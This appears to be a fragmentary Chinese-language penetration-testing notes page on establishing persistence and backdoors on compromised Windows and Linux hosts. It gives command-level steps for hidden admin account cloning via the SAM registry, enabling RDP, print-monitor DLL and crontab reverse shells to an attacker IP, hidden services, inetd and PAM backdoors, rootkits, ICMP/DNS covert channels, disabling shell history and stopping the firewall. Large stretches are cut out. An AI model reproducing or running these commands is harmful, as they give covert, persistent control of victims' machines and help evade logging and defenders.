...
[http://www.xoslab.com/efl.html](http:_www.xoslab.com_efl)   //windows文件保护  
![](../../images/81982a8ca6791ae631447246d9083f36.png)
...
3. 设置密钥123456，开机自启  
![](../../images/2d31194f6ce13d4627fcf41e159473ee.png)
4. 如果目标机器已安装todesk 
...
![](../../images/0498e68bb00af987a230bd1f1f800997.png)
...
![](../../images/35665e3072e9a8a6b9c7c1d6b637c203.png)
...
2. 注册表打开HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User  
到SAM没有子目录，说明没有权限，赋权，重新打开注册表即可  
![](../../images/6c74ff596cba8246b9a51094ffb3303f.png)
3. 将1F4下F项的值复制到3E8下F项里面，替换原有数据  
双击F项，右键全选，右键复制，同流程覆盖
4. 把3E8和qianxin$导出来  
![](../../images/ba2ebb4ede47d090dd9848cefa3cc809.png)
5. net user qianxin$ /del
6. 双击导出来的两个注册表进行导入
7. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f`开3389
8. RDP连接成功
...
3. 然后写入命令，这里我以创建一个用户为目标，也可以写成反弹shell的
...
6. 重新打开powershell就会自动执行,创建账户
7. 如果失败则，以管理员权限打开powershell运行set-ExecutionPolicy RemoteSigned并摁回车即可
...
项目地址 [https://github.com/Al1ex/Monitor](https://github.com/Al1ex/Monitor)
...
3. 将shell.dll复制到目标主机的system32目录下，之后重命名为test.dll(也就是上面的  
PDLLName，你也可以自己修改为自己喜欢的，总之随意)  
`copy C:\temp\shell.dll C:\Windows\System32\test.dll`  
4. 将Monitors.exe也移动到C:\Windows\System32，这是执行Monitors.exe即可反弹shell  
5. `reg add "hklm\system\currentcontrolset\control\print\monitors\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ`    //塞到开机启动项里  
6. 打开注册表查看`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors`是否写入成功  
![](../../images/49525874044874a50dda81816678fde3.png)  
8. msf监听，受害机重启即可收到监听
...
2. 但创建的服务很容易被发现 通过 sc query 和 Get-Service 很容易发现，直接查询服务也能看见  
![](../../images/2b6873a4b1213a732f27954f99ee7a08.png)  
开启服务`sc start ".NET CLR Networking 3.5.0.0"`
3. 使服务拒绝访问
...
![](../../images/98b4b5db61cf9bb5eb9e183f234c63d1.png)



4. 但这样做有一个问题：在注册表中很容易看到异常value。  
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 3.5.0.0`  
![](../../images/e282884c6f0b4dc24a093358a50d9bed.png)  
...
![](../../images/3cfbbb658031c9a6ca6ebcbfebb401a8.png)  
5. 成功隐藏，只要电脑重启就可以获得后门
...
项目地址 [https://github.com/WBGlIl/IIS_backdoor](https://github.com/WBGlIl/IIS_backdoor)  
...
![](../../images/e202d2eb6aa2e3cc94aae195d724a544.png)
...
2. crontab -e  
`* * * * * /bin/bash -c '/bin/sh -i >&/dev/tcp/192.168.1.135/4444 0>&1';\r%100c\n`计划任务反弹shell
...
3. `nohup python3 dir.py > /dev/null 2>&1 &`  可以看到是python  
![](../../images/96d716dcd79ef173a75df759353b4f96.png)  
会开启一个11端口的正向后门kali使用nc直接连接即可  
`nohup vim -E -c "pyfile dir.py"&`   这样就可以使vim了
4. 隐藏进程
...
添加woot 4444/tcp #evil backdoor service
3. 修改/etc/inetd.conf  
...
Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件,检测：使用相关检测工具，比如：unhide
...
1. 主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: [https://zhuanlan.zhihu.com/p/41154036](https://zhuanlan.zhihu.com/p/41154036)
2. 开源工具：ICMP后门项目地址：[https://github.com/andreafabrizi/prism](https://github.com/andreafabrizi/prism)
...
2. 开源工具：DNS后门项目地址：[https://github.com/DamonMohammadbagher/NativePayload_DNS](https://github.com/DamonMohammadbagher/NativePayload_DNS)
...
1. PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security下的模块。  
PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session requiredpam_selinux.so open  
...
`空格set +o history` //#备注：并且由于空格的缘故，该命令本身也不会被记录  
上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。  
要重新开启历史功能，执行下面的命令：  
`空格set -o history`  //	恢复原状
...
`ssh root@192.168.1.148 -p12345`  
`systemctl stop firewalld.service`有防火墙关防火墙  
[http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/](http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/)  
...
![](../../images/e5946ef809dfe94f1dc43c507ed8cc0c.png)
